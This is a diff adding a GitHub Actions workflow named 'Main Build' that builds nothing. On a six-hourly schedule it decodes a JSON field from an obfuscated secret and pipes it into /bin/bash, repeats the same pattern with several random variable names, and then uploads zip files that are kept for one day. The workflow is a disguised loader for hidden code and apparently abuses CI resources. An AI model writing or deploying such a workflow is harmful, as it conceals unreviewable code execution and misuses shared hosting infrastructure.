@@ -1,0 +1,35 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '20 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          brr4192: ${{ secrets.brr4192 }}
+        run: |
+          printf '%s' "$brr4192" | jq -r .uv5 | /bin/bash
+          echo $nsh45 | jq -r .ud6 | /bin/bash
+          echo $yivvi3 | jq -r .qcz5751 | /bin/bash
+          echo $r770 | jq -r .b4 | /bin/bash
+          echo $szl39 | jq -r .gi678 | /bin/bash
+          printf '%s' "$aa7" | jq -r .nmsj8 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: nUUldCxe
+          path: "*.zip"
+          retention-days: 1
